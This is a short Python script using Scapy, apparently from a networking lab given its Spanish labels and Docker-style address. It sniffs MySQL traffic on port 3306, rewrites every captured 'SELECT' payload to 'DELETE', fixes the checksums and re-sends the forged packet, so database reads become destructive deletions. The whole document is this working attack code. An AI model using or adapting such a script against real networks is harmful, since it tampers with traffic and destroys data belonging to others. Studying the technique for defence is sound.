from scapy.all import sniff, IP, TCP, Raw, send

ip_servidor = "172.18.0.2"
puerto_mysql = 3306

def interceptar_y_modificar(pkt):
    if pkt.haslayer(Raw):
        carga = pkt[Raw].load
        if b"SELECT" in carga:
            print(f"\n[!] Paquete capturado con SELECT:")
            print(f"Original: {carga}")
            nueva_carga = carga.replace(b"SELECT", b"DELETE")
            nuevo_pkt = pkt.copy()
            nuevo_pkt[Raw].load = nueva_carga
            del nuevo_pkt[IP].len
            del nuevo_pkt[IP].chksum
            del nuevo_pkt[TCP].chksum
            print(f"Modificado: {nueva_carga}")
            send(nuevo_pkt)
            print("[+] Paquete modificado enviado\n")

print("Escuchando y modificando paquetes en tiempo real...")
sniff(filter=f"tcp port {puerto_mysql}", prn=interceptar_y_modificar)